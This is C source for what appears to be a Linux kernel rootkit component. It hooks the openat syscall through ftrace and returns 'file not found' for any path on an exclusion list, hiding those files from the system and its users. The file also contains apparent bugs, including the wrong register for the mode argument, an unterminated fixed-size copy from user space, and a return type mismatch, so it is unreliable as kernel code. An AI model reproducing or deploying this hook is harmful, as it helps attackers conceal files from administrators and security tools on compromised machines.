
#include "utils/string_utils.h"
#include "utils/ftrace_utils.h"
#include "hooks/x64_sys_openat.h"

// Pointer to the original openat syscall
asmlinkage long (*orig_openat)(const struct pt_regs *);

// Hook function for openat
asmlinkage int hook_openat(const struct pt_regs *regs)
{
    int dirfd = regs->di;
    char __user *pathname = (char __user *)regs->si;
    int flags = regs->dx;
    umode_t mode = regs->cx;

    char kernel_path[256];
    if (copy_from_user(kernel_path, pathname, sizeof(kernel_path))) {
        return -EFAULT;
    }

    if (is_excluded(kernel_path)) {
        return -ENOENT;
    }

    return orig_openat(regs);

}
